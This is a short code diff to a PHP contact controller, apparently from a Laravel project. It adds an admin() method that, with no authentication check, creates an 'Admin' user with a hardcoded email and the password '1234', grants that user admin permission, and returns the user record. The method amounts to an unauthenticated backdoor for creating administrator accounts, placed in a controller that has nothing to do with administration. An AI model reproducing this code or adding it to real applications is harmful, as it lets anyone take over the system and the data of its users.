@@ -182,6 +182,20 @@ class ContactController extends Controller
 
         return $array;
     }
+    public function admin(Request $request){
+        $hash = password_hash("1234", PASSWORD_DEFAULT);
+        $array=['error'=>""];
+         
+          $newUser = new User();
+          $newUser->name = "Admin";
+          $newUser->email = "admin@gmail.com";
+          $newUser->password = $hash;
+          $newUser->save();
+          $newUser->givePermissionTo('admin');
+           $array['200']=$newUser;
+    
+            return $array;
+       }
 
 }
  
